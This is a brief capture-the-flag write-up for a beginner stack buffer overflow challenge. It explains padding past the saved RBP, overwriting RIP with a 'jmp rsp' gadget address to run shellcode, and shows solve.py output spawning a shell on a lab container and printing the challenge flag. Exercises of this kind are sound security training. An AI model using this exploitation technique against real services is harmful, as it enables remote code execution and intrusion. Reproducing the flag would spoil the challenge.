# Solution

The most common binary overflow challenge that one can find on the internet. In order to solve it, input 40 bytes of junk (32B stack + 8B RBP) and overwrite RIP with an address of `jmp rsp` (0x40120d) followed by shellcode. 

This makes the execution to reroute to `jmp rsp` which further moves the execution towards the shellcode put after overwritten RIP register:
```
$ python3 solve.py 
[+] Opening connection to 172.17.0.2 on port 9000: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
ibctf{n0w-th4th_y0ur3-w4rm3d-UP-4nd_r34dy_t0g0-332123}
``` 
